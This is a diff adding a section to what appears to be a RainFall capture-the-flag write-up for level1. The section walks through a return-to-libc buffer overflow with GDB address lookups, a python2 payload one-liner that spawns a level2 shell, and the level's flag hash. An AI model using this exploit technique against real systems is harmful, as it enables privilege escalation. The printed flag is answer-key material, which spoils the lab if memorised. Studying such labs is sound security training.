@@ -186,6 +186,81 @@ cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
+## Alternative exploit | Return to lib-c
+
+We can also use something called "return to lib-c" which will trick our program into returning to a libc function address instead of its usual routine
+
+To do that we will need several elements:
+
+### Locate `system()` address
+
+We need to get the address of `system()` inside our program, which means, hello GDB:
+
+```bash
+level1@RainFall:~$ gdb level1
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048542
+(gdb) r
+Starting program: /home/user/level1/level1
+
+Breakpoint 1, 0x08048542 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb)
+```
+
+We now have our address: `0xb7e6b060`
+
+### Locate the `exit()` address
+
+Same path for this one:
+
+```bash
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+```
+
+Which gives us the following address: `0xb7e5ebe0`
+
+### Locate `/bin/sh` address
+
+It will be a little different, we will use the address of the libc and try to find the string "/bin/sh" from this address:
+
+```bash
+(gdb) find &system, +9999999, "/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+(gdb)
+```
+
+Which gives us our last address: `0xb7f8cc58`
+
+### The payload
+
+Now, we can craft our payload, which will ressemble something like this:
+
+`[filler] + [system addr] + [exit addr] + [/bin/sh addr]`
+
+And execute it as usual:
+
+```bash
+level1@RainFall:~$ python2 -c 'print "a"*76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/payload.txt
+level1@RainFall:~$ cat /tmp/payload.txt - | ./level1
+whoami
+level2
+```
+
 ## Flag
 
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
